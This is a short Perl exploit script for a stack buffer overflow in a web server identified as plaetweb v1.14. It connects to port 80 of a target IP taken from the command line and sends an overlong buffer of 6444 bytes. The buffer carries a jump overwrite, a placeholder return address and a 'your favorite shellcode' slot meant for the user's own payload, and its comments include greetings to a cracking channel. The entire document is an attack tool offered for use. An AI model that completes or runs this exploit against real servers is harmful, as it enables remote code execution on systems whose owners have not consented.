#!/usr/bin/perl -w
#tool bop.pl
# buffer overflow tested against plaetweb v1.14
# humm..this exploit is not for lamers...
# Greetz: marocit and #crack.fr (specialemet christal...plus tu p�dales moins fort, moins tu #avances plus vite..)
#

use IO::Socket;
if ($#ARGV<0)
{
 print "\n write the target IP!! \n\n";
 exit;
}

$shellcode =
("YOURFAVORITSHELLCODEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");#add your favorit shellcode
$buffer = "A"x6444;
$ebx = "\x90\xEB\x08\x90";# you have the chance because ebx = eip - 4 bytes jmp short 0xff x0d3
$ret = "\x43\x43\x43\x43";# insert your ret address with (jmp ebx or call ebx)
$minibuf ="\x90\x90\x90\x90";# will be jumped by EB08
$connect = IO::Socket::INET ->new (Proto=>"tcp",
PeerAddr=> "$ARGV[0]",
PeerPort=>"80"); unless ($connect) { die "cant connect $ARGV [0]" }
print $connect "$buffer$ebx$ret$minibuf$shellcode";
print "\nsending exploit......\n\n";
